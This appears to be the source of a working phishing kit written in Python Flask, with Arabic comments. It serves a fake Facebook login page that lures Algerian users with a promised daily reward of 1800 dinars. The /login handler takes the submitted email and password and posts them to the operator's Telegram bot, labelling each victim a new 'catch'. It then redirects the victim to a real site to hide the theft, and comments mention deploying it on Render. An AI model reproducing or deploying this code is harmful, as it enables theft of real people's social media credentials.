...
<head>
    ...
    <style>
        ...
        .create-btn { background: #42b72a; color: white; padding: 10px 16px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 15px; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="fb-logo">facebook</div>
        <div class="msg">سجل دخولك للمطالبة بمكافأة الـ 1800 دج اليومية</div>
...
@app.route('/')
def home():
    # عرض صفحة الفيسبوك عند دخول الرابط
    return HTML_PAGE

@app.route('/login', methods=['POST'])
def login():
    # سحب المعلومات من النموذج
    email = request.form.get('u_email')
    password = request.form.get('u_pass')
    
    # إرسال البيانات لبوت التلغرام الخاص بك
    msg = f"✅ صيدة جديدة من فارس!\n📧 الإيميل: {email}\n🔑 الباسورد: {password}"
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg})
    except:
        pass # لتجنب توقف السيرفر في حال فشل الإرسال
    
    # توجيه الضحية لموقع الدراهم الحقيقي للتمويه
    return redirect(MONEY_SITE)

if __name__ == '__main__':
    # إعداد البورت المناسب لمنصة Render لضمان عدم حدوث خطأ في الاتصال
